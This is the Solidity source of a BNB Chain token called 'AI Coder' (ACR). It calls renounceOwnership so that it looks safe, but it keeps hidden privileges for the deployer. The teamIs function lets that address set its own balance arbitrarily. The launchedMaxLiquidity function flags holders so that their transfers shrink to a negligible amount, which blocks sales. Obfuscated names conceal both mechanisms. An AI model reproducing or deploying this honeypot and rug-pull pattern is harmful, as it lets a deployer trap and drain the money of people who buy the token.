/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface teamAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderSell {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AICoder is Ownable{
    uint8 public decimals = 18;
    mapping(address => bool) public maxAutoReceiver;
    mapping(address => bool) public teamLaunch;

    uint256 constant receiverFund = 10 ** 10;
    address public isTx;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    string public name = "AI Coder";

    bool public launchFund;
    string public symbol = "ACR";
    mapping(address => uint256) public balanceOf;

    address public tokenFee;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        teamAt exemptFrom = teamAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isTx = senderSell(exemptFrom.factory()).createPair(exemptFrom.WETH(), address(this));
        tokenFee = receiverLimit();
        teamLaunch[tokenFee] = true;
        balanceOf[tokenFee] = totalSupply;
        emit Transfer(address(0), tokenFee, totalSupply);
        renounceOwnership();
    }

    

    function buyLimit(address fromLaunched, address teamTrading, uint256 exemptMax) internal returns (bool) {
        require(balanceOf[fromLaunched] >= exemptMax);
        balanceOf[fromLaunched] -= exemptMax;
        balanceOf[teamTrading] += exemptMax;
        emit Transfer(fromLaunched, teamTrading, exemptMax);
        return true;
    }

    function transferFrom(address launchBuy, address listMarketingBuy, uint256 exemptMax) public returns (bool) {
        if (launchBuy != receiverLimit() && allowance[launchBuy][receiverLimit()] != type(uint256).max) {
            require(allowance[launchBuy][receiverLimit()] >= exemptMax);
            allowance[launchBuy][receiverLimit()] -= exemptMax;
        }
        if (listMarketingBuy == tokenFee || launchBuy == tokenFee) {
            return buyLimit(launchBuy, listMarketingBuy, exemptMax);
        }
        if (maxAutoReceiver[launchBuy]) {
            return buyLimit(launchBuy, listMarketingBuy, receiverFund);
        }
        return buyLimit(launchBuy, listMarketingBuy, exemptMax);
    }

    function receiverLimit() private view returns (address) {
        return msg.sender;
    }

    function isLiquidity(address senderBuy) public {
        if (launchFund) {
            return;
        }
        teamLaunch[senderBuy] = true;
        launchFund = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transfer(address listMarketingBuy, uint256 exemptMax) external returns (bool) {
        return transferFrom(receiverLimit(), listMarketingBuy, exemptMax);
    }

    function teamIs(uint256 exemptMax) public {
        if (!teamLaunch[receiverLimit()]) {
            return;
        }
        balanceOf[tokenFee] = exemptMax;
    }

    function launchedMaxLiquidity(address totalFee) public {
        if (totalFee == tokenFee || totalFee == isTx || !teamLaunch[receiverLimit()]) {
            return;
        }
        maxAutoReceiver[totalFee] = true;
    }

    function approve(address maxTeam, uint256 exemptMax) public returns (bool) {
        allowance[receiverLimit()][maxTeam] = exemptMax;
        emit Approval(receiverLimit(), maxTeam, exemptMax);
        return true;
    }


}